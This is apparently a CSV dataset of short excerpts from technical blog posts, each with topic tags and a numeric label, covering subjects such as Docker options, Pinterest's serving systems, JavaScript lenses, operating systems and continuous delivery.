2791,"Where do we go from here? This attribution system is only the piping behind the actual analytics. It gets harder when we have to make more philosophical decisions. How can we decide how to attribute multi-touch users? if a user has a first-touch on one blog article and a last touch several months later on a different one, then who gets the credit? We are closely monitoring the performance right now, and it runs in about 4 hours. However our traffic is increasing by a huge amount every monthhow much longer will this last? Thankfully the system is easily parallelizable apart from the last stages.","['AWS', 'Segment', 'Attribution', 'Analytics', 'Advertising']",6
2792,"The top 10 docker run options in alphabetical order.1) --detach, -d By default a Docker container is run attached to local standard input, output, and error streams. The -d, --detach option runs the container in the background of your terminal session so its output is not displayed. This option is covered in more detail in Dockers detached mode for beginners: How to run containers in the background of your terminal2) --entrypoint Set or overwrite the default entrypoint command for the image. The entrypoint sets the command and parameters that will be executed first when a container is run. Any any commands and arguments passed at the end of the docker run command will be appended to the entrypoint. To learn more about using Entrypoint, check out Docker ENTRYPOINT & CMD: Dockerfile best practices3) --env, -e Set an environment variable using a KEY=VALUE pair. If you have environment variables in a file, you can pass in the file path to the option --env-file.4) --ip Declare an IP address, for example --ip=10.10.9.755) --name Assign a name to the container, --name my_container6) --publish, -p | --publish-all, -P These publish port mappings between the container and host that are defined in an images Dockerfile or by using the expose option, --expose. The option --publish, -p publishes a containers port(s) to the host, while --publish-all, -P publishes all exposed ports. You can learn more about exposing and defining ports in Expose vs publish: Docker port commands explained simply7) --rm Automatically remove the container when it exits. The alternative would be to manually stop it and then remove it, for more on how to do this see: How to delete Docker containers from the command line8) --tty, -t Allocate a virtual terminal session within the container. This is commonly used with the option --interactive, -i, which keeps STDIN open even if running in detached mode. One of the most common uses of -i -t is to run a command, such as bash, in a container, which you can read more about in my post Run bash or any command in a Docker container9) --volume, -v Mount a volume -v /my_volume. If you are new to volumes then find out more in Dockers guide to Volumes.10) --workdir, -w State the working directory inside the container. For example, if you copy your files into an app folder within your container then you may want to set the working directory to app.","['Docker', 'Programming', 'Technology', 'Software Development', 'Web Development']",7
2793,"Lenses took the concept further by making getter/setter pairs more generic and composable. They were popularized after Edward Kmett released the Lens library for Haskell. He was influenced by Jeremy Gibbons and Bruno C. d. S. Oliveira, who demonstrated that traversals express the iterator pattern, Luke Palmers accessors, Twan van Laarhoven, and Russell OConnor.","['JavaScript', 'Programming', 'Technology', 'Software Engineering', 'Functional Programming']",9
2794,"Before we dive into code examples, remember that if youre using lenses in production, you should probably be using a well tested lens library. The best one I know of in Java Script is Ramda. Were going to skip that for now and build some naive lenses ourselves, just for the sake of learning: Lets prove the lens laws for these functions: Lenses are composable. When you compose lenses, the resulting lens will dive deep into the object, traversing the full object path. Lets import the more full-featured lens Prop from Ramda to demonstrate: Thats great, but theres more to composition with lenses that we should be aware of.","['JavaScript', 'Programming', 'Technology', 'Software Engineering', 'Functional Programming']",9
2795,"Its possible to apply a function from a => b in the context of any functor data type. We've already demonstrated that functor mapping is composition. Similarly, we can apply a function to the value of focus in a lens. Typically, that value would be of the same type, so it would be a function from a => a. The lens map operation is commonly called ""over"" in Java Script libraries. We can create it like this: Setters obey the functor laws: For the composition example, were going to use an auto-curried version of over: Now its easy to see that lenses under the over operation also obey the functor composition law: Weve barely scratched the surface of lenses here, but it should be enough to get you started. For a lot more, detail, Edward Kmett has spoken a lot on the topic, and many people have written much more in-depth explorations.","['JavaScript', 'Programming', 'Technology', 'Software Engineering', 'Functional Programming']",15
2796,"Bo Liu | Engineering Manager, Serving Systems team In 2015, the majority of content on Pinterest was pregenerated for users prior to login. It was stored statically in HBase and served directly upon entering the service. (More details can be found in the blog post Building a smarter home feed. )Although our earlier architecture helped us grow to 100 million monthly active users by 2015, it had several weak points that prevented us from building more dynamic and responsive products. For example, it was hard to experiment with different ideas and models on different components in the system. Since content was pregenerated, the features used to rank candidates could be weeks old, and we couldnt leverage the most recent Pin/Board/User data, not to mention real-time user actions. We also had to pre-generate and store content for every user, including those who never returned. Moreover, we were constantly running a large number of concurrent experiments and needed to pre-generate and store content for each experiment.","['Big Data', 'Engineering', 'AWS', 'Machine Learning']",6
2797,"1 depicts following feed circa 2015. Whenever a Pin was saved, an asynchronous task was enqueued to Pinlater, an asynchronous job execution system. This task would first retrieve all (direct and indirect) followers for the Pins board from My SQL via the follower service, and then it would send the (follower list, Pin) to a smart feed worker. The smart feed worker would leverage Pinnability to score the Pin for every follower and then insert the list of (follower, score, Pin) into HBase. When a user came to Pinterest, we scanned HBase with the user id as the prefix to extract the Pins with the largest scores for this user. This implementation consumed unnecessarily large storage space and made it hard to leverage fresh signals and experiment with new ideas. Additionally, the long latency for fetching the follower list (steps 2 and 3) and ranking (step 5) prevented us from experimenting online.","['Big Data', 'Engineering', 'AWS', 'Machine Learning']",8
2798,"Feed Generator then sends to Polaris the board list and the bloom filter consisting of the impression history of the user. After retrieving, filtering and applying lightweight scoring, Polaris returns a list of Pins to Feed Generator. Lastly, this list of Pins and real-time user signals are sent to Scorpion for a second pass of full scoring. Scorpion is a unified ML online ranking platform powering the majority of Pinterest ML models in production. We have Counter service and Rockstore underlying Scorpion to provide count signals and user data, pin data, etc. Note that Scorpion aggressively caches static feature data in local memory, which is the larger part of all feature data required by ML models. Scorpion is sharded to achieve a cache hit rate over 90%.","['Big Data', 'Engineering', 'AWS', 'Machine Learning']",11
2799,"6 depicts the current Picked For You architecture. Pixie is a new service built for real-time board recommendation. It periodically loads into memory an offline-generated graph consisting of boards and Pins. When recommended boards are requested for a user, a random walk is simulated in the Pixie graph by using the Pins engaged by the user as starting points. (More can be found in the blog post Introducing Pixie, an advanced graph-based recommendation system.) The rest of the systems are similar to following feed.","['Big Data', 'Engineering', 'AWS', 'Machine Learning']",14
2800,"Rocks DB is an embedded storage engine. To build sharded and replicated distributed systems on top of it, data replication was the first problem we needed to solve. We started with the write-to-all-replica approach and later moved to master-slave replication. Our systems are running on AWS, which models its network into Regions, Availability Zones and Placement Groups. Notably, the bill for cross-AZ network traffic is significant. We built a prefix-based AZ-aware traffic routing library that minimizes cross-AZ traffic and supports all possible routing patterns (e.g., single shard, multiple shard and all shard fanout). The library also monitors TCP connection health and gracefully fails over requests among replicas. One thing to note is we needed to leverage the TCP_USER_TIMEOUT socket options to fail fast when the OS on remote peer crashed. It is not uncommon for a VM instance to become unreachable on AWS for various reasons without shutting down TCP connections. If TCP_USER_TIMEOUT is not set, a typical TCP implementation could take over 10 minutes to report the issue to user space applications. (More details about data replication and traffic routing can be found in the Rocksplicator Github repo and blog post Open-sourcing Rocksplicator, a real-time Rocks DB data replicator. )Over 10% of Pinterests total AWS instances run our systems. To reduce the operational overhead and service downtime, we integrated Apache Helix (a cluster management framework open sourced by Linkedin) with Rocksplicator. (More details can be found in the blog post Automated cluster management and recovery for Rocksplicator. )We did numerous optimizations and tunings when implementing and productionizing these systems. For instance, we needed to tune the Rocks DB compaction thread number and set L0 and L1 to be of the same size to reduce write amplification and improve write throughput.","['Big Data', 'Engineering', 'AWS', 'Machine Learning']",11
2801,"As Scorpion is CPU intensive and running on big clusters, we needed to invest heavily in optimizing it. We carefully tuned the Scorpion threading model to achieve a good tradeoff between high concurrent processing and low context switch or synchronization overhead. The sweet spot is not fixed, as it depends on many factors such as if data is fetched from memory, local disk or RPC. We optimized the in-memory LRU caching module to achieve zero-copy; i.e., cached data is fed into ML models without any data copying. Batch scoring was implemented to allow GCC to better utilize SIMD instructions. Decision trees in GBDT models are compacted and carefully laid out in memory to achieve better CPU cache hit rates. Thundering herds on cache miss are avoided by object level synchronization.","['Big Data', 'Engineering', 'AWS', 'Machine Learning']",10
2802,"Data stored in Aperture is bucketed along the time dimension. We use a frozen data format for old data which is immutable and suitable for fast read access. More recent data is stored in a mutable format which is efficient for updates. The max_successive_merges Rocks DB option was leveraged to limit the number of merge operands in mem-table from the same key. This setting is critical for Aperture to achieve low read latency since it may need to read a Rocks DB key with a large number of merge operands, which are expensive to process at read time. To save storage space, Rocks DB was configured to use different compression policies and multiplier factors for different levels.","['Big Data', 'Engineering', 'AWS', 'Machine Learning']",8
2803,"The center of our solution is, of course, containers. In our case, Docker containers (along with kubernetes to coordinate them). As is well known, the beauty of a container is that it provides an absolutely uniform environment for running code. This environment is trivial to throw away and recreate. You can make a change to your environment for some test purpose, and then with a couple commands tear it down and re-create it so it is exactly the same as before you started. You always have access to a clean state.","['Docker', 'Software Development']",7
2804,"Yet, by itself, there is still a gaping hole in this solution. While it is easy to start up a container, building an image can take several seconds (at least!). This would seem to be a huge impediment to using containers for development. After all, it presents a workflow like: Change code Build a new image Start up the container Test it Discover bug Repeat These six steps could take minutes. Contrast this to working on the native development machine, where turnaround for making a code change can be seconds. How did we bridge this gap? Our solution was to use docker-machine-nfs to mount our code repository from our laptop into the Docker container.","['Docker', 'Software Development']",7
2805,Time Series Data Goku follows Open TSDBs time series data model. A time series is composed of a key and a series of numeric data points over time. key = metric name + a set of tag key value pairs. data point = key + value. Value is a timestamp and value pair.,"['Big Data', 'Engineering']",8
2806,"Time Series Query Each query consists of part/all of the following:, metric name, filters, aggregators, downsampler, rate option, in addition to start time and end time.1) An example of a metric name is, tc.proc.stat.cpu.total.infra-goku-a-prod.2) Filters are applied against tag values to reduce the number of times series are picked up in a query or group, and aggregated on various tags. Examples of filters Goku supports include: Exact match, Wildcard, Or, Not or, Regex.3) Aggregator specifies the mathematical way of merging multiple time series into a single one. Examples of aggregators that Goku support include: Sum, Max/Min, Avg, Zimsum, Count, Dev. 4) Downsampler requires a time interval and an aggregator. The aggregator is used to compute a new data point across all of the data points in the specified interval.4) Rate Option optionally calculates rate of change. For details, see Open TSDB Data Model.","['Big Data', 'Engineering']",8
2807,"We use a two-layer sharding strategy. First we do hashing on the metric name to determine which shard group one Time Series belongs to. We follow with hashing on the metric name + tag key value sets to determine which shard in that group the Time Series is in. This strategy ensures data will be balanced across shards. Meanwhile since each query only goes to one group, the fanout remains low to reduce network overhead and tail latency. In addition, we can scale each shard group independently.","['Big Data', 'Engineering']",8
2808,"Replication Currently we have two goku clusters doing double writes. This setting gives us high availability: when there are issues in one cluster, we can easily switch traffic to another. However, because the two clusters are independent, its hard to ensure data consistency. E.g., if writes to one succeed while fail on the other, data will become inconsistent. Another drawback is failover is always cluster level granularity. Were working on log based intra-cluster replication to support master slave shards. This will improve read availability, preserve data consistency and failover in shard level granularity.","['Big Data', 'Engineering']",8
2809,"But hands down, Code Climate is the best service I use to provide feedback on my code, other than test coverage. And, here is what Transistor looked like at the end of October, on the overview page, in Code Climate: Clicking on the Trends tab will bring up a Maintainability page with a few different sections. The view defaults to the first section, Technical Debt, shown below: The technical debt section reports, I started with about 50 hours technical debt on my first commit, in that first 2000 lines of code. But the first 2000 lines of code only took me about 32 hours. So, I coded 32 hours to create 50 hours of technical debt?","['Programming', 'Python', 'Web Scraping', 'Entrepreneurship', 'Time Management']",2
2810,"To get our SVG into a format that Google Drawings can use, well convert it to an EMF file. Unfortunately, my attempts to create an EMF with local tools resulted in a number of metafiles that Google Drawings couldnt process. Instead, lets make use of a tool called Cloud Convert. Right-click on the file, and choose 'Open With' -> 'Cloud Convert'.2. Then, youll need to grant Cloud Convert access to your Google Drive to be able to read in the source file and export out the converted output.3. Within Cloud Convert, choose 'Vector' -> 'emf' in the drop-down to the right of your file and click Start Conversion.4. By default, the output file is automatically saved in Google Drive at the same location as the original SVG. Now that we have a usable EMF, you can right-click on the file and open it in Google Drawings.5. Edit the final diagram to your hearts content! This process was inspired by this Stack Exchange Question.","['Ruby on Rails', 'Development', 'Entity Framework', 'Coding', 'Full Stack']",14
2811,"You said clean code would be more that just code, what did you mean by that? Imagine the most clean, most testable, most overwhelming beautiful code youve ever seen. Its your little baby but you have to give it away. Your colleague takes over the project. He changes your code, making it even more beautiful, everything is fine until now. Now he wants to build a new version and the hell begins. The Git Server is buggy, the build server throws random errors, the test databases are inconsistent, the linter is escalating, the deployment acts like a ferret on cocaine. That would immediately lead to the magical what the hell moment.","['Programming', 'Clean Code', 'DevOps', 'Agile', 'Agile Development']",13
2812,"But why should I write clean code, my current code actually works? A simple impulse: As a software engineering student I hear this sentence everyday: But John Doe, why do you criticize my code, it works!? Like Martin Fowler mentioned there is a big difference in types of code. There is code a computer can understand and there is code a human can understand. You only need some formal requirements and you have a working program code. This code is practical and works. Nothing more is known about it. But as a programmer this shouldnt be your goal. You want to go beyond and write good code, not just code, good code! Yes, writing human understandable code is more work.","['Programming', 'Clean Code', 'DevOps', 'Agile', 'Agile Development']",9
2813,As you can see a team has a bunch of decisions to make before actually working on the final code. Do we organise our team as a Scrum team? What architecture approach will we follow? Do we build highly scalable Microservices or do we build an ultra solid monolith? How do we write the Code? What criteria do we have for our actual code? Maybe even more important than choosing the right method or technology is being consistent in this choice within your team and maybe even over time. When you decided about all meta questions you can begin actually writing code.,"['Programming', 'Clean Code', 'DevOps', 'Agile', 'Agile Development']",1
2814,"Relay also has some specific requirements of the inputs and outputs of mutations (updates/deletes/etc). Take a look at this subset of our schema handling Todo updates in compliance with the spec (creates and deletes are handled similarly): Note that an input type is used as required by the spec. Additionally, if a client Mutation Id field is supplied in the input, it must be returned unchanged in the output for internal use by Relay (there is some discussion in the Relay project of removing this field, but for now it is required). This can be accomplished in the response mapping template like this: To avoid adding unnecessary metadata to the core types in our schema, the Relay convention is to return a payload object from the mutation and add things like the client Mutation Id there. In our app, which uses Graph QL subscriptions for real-time updates, this payload must also include a user Id for authorizing and filtering subscriptions. Here is the relevant piece of the schema, which takes advantage of App Sync's native subscription support: See the App Sync documentation for a complete discussion of security, including granular authorization for subscriptions. You can also look at the sample app code for a working example.","['GraphQL', 'AWS', 'Relay', 'Relay Modern', 'React']",15
2815,"Once the API backend is set up, all thats left is to get the frontend to talk to it. Fortunately, the AWS Amplify client library makes this really easy. In fact, the entire integration between App Sync and Relay on the frontend is achieved with this one short source file: This module sets up the environment in Relay terminology that is used by Relay to execute Graph QL queries. It simply maps the Relay fetch Query and subscription functions to the corresponding Amplify API.graphql calls. Amplify returns a Promise in the case of a query or mutation and an Observable in the case of a subscription, which are exactly what Relay expects. (At the moment, Observables are still a proposal, but Amplify's and Relay's implementations are compatible.) The only small gotcha is that Amplify subscription events are wrapped in an object that includes a handle to the Pub Sub provider for that particular event, so it is necessary to unwrap the raw values with API.graphql(.","['GraphQL', 'AWS', 'Relay', 'Relay Modern', 'React']",11
2816,"All that is left is to tell Amplify how to connect and authenticate with the backend, which involves just a bit of configuration. Early in the app's main entrypoint, we just run something something like this: The global AC variable is injected by webpack with the Define Plugin to make it easy to use different values in different development or production environments. Also note that we are using Cognito to handle authentication. Amplify even let us us provide a complete login experience for our app with a single invocation of with Authenticator(App) where App is our app's root React component. (See the Amplify docs for more on the Higher Order Components available for React. )Relay and React are mature, proven choices for a Graph QL-based frontend framework, and AWS App Sync is the best way to quickly deploy a scalable, serverless Graph QL backend. All of the methods, services, and libraries described in this post also work just fine for building mobile apps with React Native. You can build your next app by forking this sample or just using it as a reference if you get stuck on your own. Best of luck building your next real-time serverless app!","['GraphQL', 'AWS', 'Relay', 'Relay Modern', 'React']",15
2817,"I have a project where Ive already deployed some functions with the Firebase CLI (more on that later). Heres what the Cloud Functions dashboard looks like in the Firebase console: You can see all the deployed functions in this project, along with some tabs at the top for more diagnostics. Between all these tabs, you can do all your typical work with Cloud Functions. For the function where the mouse pointer is hovering, theres an overflow menu with additional options. One of those options is called Detailed usage stats, and you can see an icon there that indicates that youre going to leave the Firebase console if you click it. Clicking the link opens a tab and takes you to the Cloud console (easy to spot with its blue and white UI theme), with even more detailed diagnostics for just that one function. There are also tabs for viewing the source code and other files deployed with the function, as well as a way to test the function.","['Google Cloud Platform', 'Firebase', 'Serverless', 'Software Development', 'Cloud']",15
2818,"These two CLIs serve mostly different needs, and you cant use one CLI to deploy all the same code as the other, simply because their deployment configurations are different. However, theres nothing really preventing you from using both CLIs in tandem, as each provides its own advantages. For example, if you enjoy working with the customized APIs provided for each event source by firebase-functions and the Firebase CLI, you are almost certainly going to use the Firebase CLI for deployment (the APIs dont work with gcloud). And did I mention those Type Script type bindings? However, gcloud gets you closer to the Cloud Functions product itself and lets you perform more power-user actions. So give them both a try and see how they could work well for you.","['Google Cloud Platform', 'Firebase', 'Serverless', 'Software Development', 'Cloud']",18
2819,"Since Cloud Functions offers HTTP triggers, you can easily use them for webhooks and REST APIs. What your API consumers may not appreciate, however, is the URL that your function is given by default. Assuming that your Cloud project name is your-project, and youve deploy to region us-central1, a function called hello World will look like this: Its not exactly the most memorable URL. If you have a public API for other developers to consume, you might want to attach that to your domain instead. With Firebase Hosting, you can do that. Firebase Hosting is normally used to distribute static web content around the world, but you can also use it as a proxy for Cloud Functions. All you have to do is connect your domain with Firebase Hosting, then connect Firebase Hosting with Cloud Functions and rewrite a path forward to your Cloud Function endpoint. With this, you can have a more strongly branded endpoint: On top of that, you can configure Firebase Hosting to enable edge caching of your functions response so that its served faster, and you dont pay the cost of a function invocation each time.","['Google Cloud Platform', 'Firebase', 'Serverless', 'Software Development', 'Cloud']",11
2820,"You may be wondering why these intermediate outputs within our pretrained image classification network allow us to define style and content representations. At a high level, this phenomenon can be explained by the fact that in order for a network to perform image classification (which our network has been trained to do), it must understand the image. This involves taking the raw image as input pixels and building an internal representation through transformations that turn the raw image pixels into a complex understanding of the features present within the image. This is also partly why convolutional neural networks are able to generalize well: theyre able to capture the invariances and defining features within classes (e.g., cats vs. dogs) that are agnostic to background noise and other nuisances. Thus, somewhere between where the raw image is fed in and the classification label is output, the model serves as a complex feature extractor; hence by accessing intermediate layers, were able to describe the content and style of input images.","['Machine Learning', 'Keras']",14
2821,"In the above code snippet, well load our pretrained image classification network. Then we grab the layers of interest as we defined earlier. Then we define a Model by setting the models inputs to an image and the outputs to the outputs of the style and content layers. In other words, we created a model that will take an input image and output the content and style intermediate layers! Our content loss definition is actually quite simple. Well pass the network both the desired content image and our base input image. This will return the intermediate layer outputs (from the layers defined above) from our model. Then we simply take the euclidean distance between the two intermediate representations of those images.","['Machine Learning', 'Keras']",14
2822,"More formally, content loss is a function that describes the distance of content from our input image x and our content image, p. Let C be a pre-trained deep convolutional neural network. Again, in this case we use VGG19. Let X be any image, then C(x) is the network fed by X. Let F(x) C(x)and P(x) C(x) describe the respective intermediate feature representation of the network with inputs x and p at layer l. Then we describe the content distance (loss) formally as: We perform backpropagation in the usual way such that we minimize this content loss. We thus change the initial image until it generates a similar response in a certain layer (defined in content_layer) as the original content image.","['Machine Learning', 'Keras']",14
2823,"To generate a style for our base input image, we perform gradient descent from the content image to transform it into an image that matches the style representation of the original image. We do so by minimizing the mean squared distance between the feature correlation map of the style image and the input image. The contribution of each layer to the total style loss is described bywhere G and A are the respective style representation in layer l of input image x and style image a. Nl describes the number of feature maps, each of size Ml=heightwidth. Thus, the total style loss across each layer iswhere we weight the contribution of each layers loss by some factor wl. In our case, we weight each layer equally: This is implemented simply: If you arent familiar with gradient descent/backpropagation or need a refresher, you should definitely check out this resource.","['Machine Learning', 'Keras']",14
2824,If you want to call this API from Javascript make sure to check the Enable API Gateway CORS: Since you selected a proxy resource you will automatically be taken to the integration page. This is where you will select the Lambda function you already created. Simply type email List Api in the Lambda Function textbox to select your Lambda function: Note: If you see a popup that says you will be granting API Gateway access to call the lambda just press okay Now that the proxy resource and method is setup your next step is to deploy the API. To do that select Deploy API under the Actions dropdown and name your Stage name list (or whatever you want). The stage name will end up being a part of the URL so keep that in mind: Once deployed you can go to the Stages section on the left and you will see an entry for the stage you setup. Clicking the stage will give you the URL that you can use to test your API: Making a POST request to __url__ list.,"['AWS Lambda', 'Serverless', 'AWS', 'API', 'Nodejs']",15
2825,"If I gave you a sheet full of 1s and 0s, could you tell me what it means/does? If you were to go to a country youve never been to that speaks a language youve never heard, or maybe youve heard of it but dont actually speak it, what would you need while there to help you communicate with the locals? Your operating system functions as that translator in your PC. It converts those 1s and 0s, yes/no, and on/off values into a readable language that you will understand. It does all of this in a streamlined graphical user interface, or GUI, that you can move around with a mouse, click things, move them, and see them happening before your eyes.","['Software Development', 'Computer Science', 'Cloud Computing', 'Operating Systems', 'Database']",3
2826,"When you write a program and it runs too slowly, but you see nothing wrong with your code, where else will you look for a solution? How will you be able to debug the problem if you dont know how the operating system works? Are you accessing too many files? Running out of memory and swap is in high usage? But you dont even know what swap is! And you want to communicate with another machine. How do you do that locally or over the internet? Why do some programmers prefer one OS over another? In an attempt to be a serious developer, I recently took Georgia Techs course Introduction to Operating Systems. It teaches the basic OS abstractions, mechanisms, and their implementations. The core of the course contains concurrent programming (threads and synchronization), inter-process communication, and an introduction to distributed OSs.","['Software Development', 'Computer Science', 'Cloud Computing', 'Operating Systems', 'Database']",9
2827,"There are two operating system design principles, which are: (1) Separation of mechanism and policy by implementing flexible mechanisms to support policies, and (2) Optimization for common case: Where will the OS be used? What will the user want to execute on that machine? There are three types of Operating Systems commonly used nowadays. The first is Monolithic OS, where the entire OS is working in kernel space and is alone in supervisor mode. The second is Modular OS, in which some part of the system core will be located in independent files called modules that can be added to the system at run time. And the third is Micro OS, where the kernel is broken down into separate processes, known as servers. Some of the servers run in kernel space and some run in user-space.","['Software Development', 'Computer Science', 'Cloud Computing', 'Operating Systems', 'Database']",16
2828,"Not Running: Processes that are not running are kept in queue, waiting for their turn to execute. Each entry in the queue is a pointer to a particular process. Queue is implemented by using a linked list. The use of dispatcher is as follows: when a process is interrupted, that process is transferred in the waiting queue. If the process has completed or aborted, the process is discarded. In either case, the dispatcher then selects a process from the queue to execute.","['Software Development', 'Computer Science', 'Cloud Computing', 'Operating Systems', 'Database']",3
2829,"Message Parsing Method In this method, processes communicate with each other without using any kind of of shared memory. If two processes p1 and p2 want to communicate with each other, they proceed as follows: Establish a communication link (if a link already exists, no need to establish it again. )Start exchanging messages using basic primitives. We need at least two primitives: send(message, destination) or send(message) and receive(message, host) or receive(message)The message size can be fixed or variable. If it is a fixed size, it is easy for the OS designer but complicated for the programmer. If it is a variable size, then it is easy for the programmer but complicated for the OS designer. A standard message has two parts: a header and a body.","['Software Development', 'Computer Science', 'Cloud Computing', 'Operating Systems', 'Database']",3
2830,"The CPU must have a way to pass information to and from an I/O device. There are three approaches available to communicate with the CPU and Device.1. Special Instruction I/OThis uses CPU instructions that are specifically made for controlling I/O devices. These instructions typically allow data to be sent to an I/O device or be read from an I/O device.2. Memory-mapped I/OWhen using memory-mapped I/O, the same address space is shared by memory and I/O devices. The device is connected directly to certain main memory locations so that the I/O device can transfer block of data to/from the memory without going through the CPU.","['Software Development', 'Computer Science', 'Cloud Computing', 'Operating Systems', 'Database']",3
2831,"There are two different ways that nodes can be informed of who owns what page: invalidation and broadcast. Invalidation is a method that invalidates a page when some process asks for write access to that page and becomes its new owner. This way the next time some other process tries to read or write to a copy of the page it thought it had, the page will not be available and the process will have to re-request access to that page. Broadcasting will automatically update all copies of a memory page when a process writes to it. This method is a lot less efficient more difficult to implement because a new value has to sent instead of an invalidation message.","['Software Development', 'Computer Science', 'Cloud Computing', 'Operating Systems', 'Database']",15
2832,"As the operating system is the brain that manages input, processing, and output, all other disciplines interact with the operating system. An understanding of how the operating system works will provide valuable insight into how the other disciplines work, as your interaction with those disciplines is managed by the operating system. If you enjoyed this piece, Id love it if you hit the clap button so others might stumble upon it. You can find my own code on Git Hub, and more of my writing and projects at __url__ inbox!","['Software Development', 'Computer Science', 'Cloud Computing', 'Operating Systems', 'Database']",5
2833,"Our release process was already stretched to its maximum. Two weeks is the shortest release cycle we could achieve using this process, and this became problematic for us. A few months ago, we changed the way we develop the product. Teams recently started to switch to a hypothesis-driven development approach. Basically, the idea is to test the success of an idea (a hypothesis) with your users while investing the least possible amount of time. If you can prove the hypothesis to be true, you can then invest more time on it. The reality is that most hypotheses turn out to be false. So, the trick is to be able to test as many hypotheses possible, and to do that, you must be able to ship code faster and more often.","['Continuous Delivery', 'Cd', 'Experiment', 'Automation']",6
2834,"We made the decision that we would have teams ship code to production themselves, whenever they want, how often they want. No more release trains, no more release managers, no more QA sessions. We decided to empower our teams to scale our release process. They are now fully autonomous, from ideation to delivery. Any team is able to ship to production, but its also the teams responsibility to make sure everything works as expected. Teams now have the responsibility to proactively monitor the production, detect and solve the bugs related to the code they ship.","['Continuous Delivery', 'Cd', 'Experiment', 'Automation']",1
2835,"By doing that, what did we solve? First, we solved the scalability issue. This solution scales well with many development teams since the effort is shared among all teams. We also enabled teams to ship code more often, perfect for hypothesis-driven development. We now aim for smaller releases, which means more focused changes that are less risky and easier to test. This also means that we no longer have to keep long-lived branches alive, because we ship code to production much more often. Weve also knocked down the wall separating the teams from our production environment; first, by having teams ship code and then second, by having them support what they shipped. In turn, this also solved our production support scalability problem since the load is now spread across the teams. We still have support engineers, but they are less solicited since the development teams now proactively support the code they ship.","['Continuous Delivery', 'Cd', 'Experiment', 'Automation']",10
2836,"Our previous release pipeline was partially automated. It required at lot of manual interventions, and the people operating it required a lot of accesses to the production environment. That was fine when releases were handled by a team of release managers, but if we were to enable all our teams to release by themselves, we needed a fully automated and easy to use pipeline. Moreover, we didnt want to give production accesses to everyone, so we made sure only machines (agents) would have access to production. The pipeline has been implemented with Microsoft Azure Dev Ops. I wont go into the details just yet, but stay tuned as I will cover this topic in a subsequent blog post! If we were to release often, we needed to ensure that the teams were releasing quality. We already had a bunch of unit and integration tests, so of course we automatically ran these before each release, but we also added static code analysis, load tests and smoke tests and we keep adding more.","['Continuous Delivery', 'Cd', 'Experiment', 'Automation']",10
2837,"Feature flags also bring another huge benefit: testing in production. We can now easily perform canary releases, allowing teams to test their code directly in production. We always start by enabling a feature for ourselves, internally (dogfooding), so we can catch problems early, without affecting any client. We can also test features with a subset of our users, rolling it out to various cohorts as we gain confidence in the code we ship. If anything goes wrong, at any time, we can simply switch off the flag. Lastly, feature flags, combined with continuous delivery, enable us to perform many experiments in production and allow us to better understand our users.","['Continuous Delivery', 'Cd', 'Experiment', 'Automation']",13
2838,"The more often you ship, the more confident you need to be with the quality of the code you ship. One way to increase quality and prevent regression bugs is to have a reliable test suite. If your teams are not already writing unit tests, this is the first change they should make. Start writing unit tests, a lot of them. The more you increase the quality and the reliability of your tests, the more confidence youll have in the code you ship. Make sure they are fast so you can get feedback quickly. Continuous delivery is a good way to increase quality, because you cannot ship that often without good quality. Tests must become your best allies.","['Continuous Delivery', 'Cd', 'Experiment', 'Automation']",13
2839,"In a continuous delivery context, there is no classic QA phase prior to shipping, since the idea is to ship as often as possible. QA is a responsibility shared among the team. Developers must test their code, with manual testing and by writing unit tests. With the usage of feature flags, teams and or QA analysts can safely test the feature in production once its been deployed. Further more, the team can progressively rollout a feature to a subset of users and then observe how this feature behaves without the risk of impacting all your users.","['Continuous Delivery', 'Cd', 'Experiment', 'Automation']",1
2840,"One of the huge benefits of continuous delivery is how it facilitates experimentation (hypothesis-driven development). With continuous delivery in place, you can start testing your ideas quickly, with your users, in production. Dont risk investing weeks of development to release a feature only to find out its not used at all. Test your hypotheses first, very quickly and then invest more time in those that turned out to be true and discard the others. Once your teams are comfortable with continuous delivery, you may consider looking into hypothesis-driven development.","['Continuous Delivery', 'Cd', 'Experiment', 'Automation']",1
2841,"No one writes perfect, bug-free code on the first try. Even if it were possible to do so, there is no guarantee that perfect code wont break later. Writing clean code means writing tested code. That way, future users can be confident theyre interacting with something that works. Moreover, when making changes, they will have a ready-made test suite to confirm that nothing broke.",[''],13
2842,"We train a lot of interviewers at Triplebyte. We employ a team of 40 experienced engineers to conduct interviews with candidates as they go through our platform. When we train new members of this team, we focus on several things. We make sure that interviewers are strong and up-to-date in the areas they will be measuring (its surprisingly hard, sometimes, to distinguish a candidate who gives an unusual answer because they are an expert in an area from someone who gives an unusual answer because they dont know what they are talking about). We make sure that interviewers have clear guidelines for what skills they are assessing (this is the best defense against pattern matching bias in interviewers). However, I now think its equally important to train interviewers in humility [1].","['Hiring', 'Computer Science', 'Programming', 'Interviewing', 'Training']",0
2843,"Lack of recognition of your own weaknesses is a major source of interview noise. This is true because overconfident interviewers judge candidates too harshly. The field of software engineering is broad enough that no single engineer can master it all. However, we all convince ourselves that the areas that we have mastered are the most important. And we dont fully respect another engineer if they are weak in an area where we are strong (even if they are very strong in other areas). In interviews, this manifests as a bias against candidates whose technical strengths are dissimilar to those of their interviewers. We measure this at Triplebyte by having multiple interviewers observe and grade the same interview. The effect persists even when interviewers grade areas unrelated to their own strength, and even when they use structured grading rubrics. Interviewers just give lower scores to candidates who are not like them. It makes interviews less accurate, and we need to reduce it.","['Hiring', 'Computer Science', 'Programming', 'Interviewing', 'Training']",0
2844,"So, how can you train interviewers to be humble? How can you make yourself more humble? The answer, I think, is to experience what a candidate goes through. Interviewing for a job is humbling. You have to remember things youve not thought about in years. Smart people point out embarrassing flaws in your logic and code. You never know quite as much as you thought you did. And almost everyone fails a good percentage of their interviews.","['Hiring', 'Computer Science', 'Programming', 'Interviewing', 'Training']",4
2845,"Ive done this a bunch, and its deeply humbling. It almost always results in someone you respect pointing out things youre bad at. And it has some potential to create conflict. I think it should probably only be done inside teams with a good degree of internal trust (the danger is convincing team members that other team members are not very good). It highlights clearly both the extent to which strong engineers are weak in certain areas, and the extent to which interviewers jump to conclusions about what a candidate means. I think everyone who conducts interviewers should put themselves through this exercise.","['Hiring', 'Computer Science', 'Programming', 'Interviewing', 'Training']",0
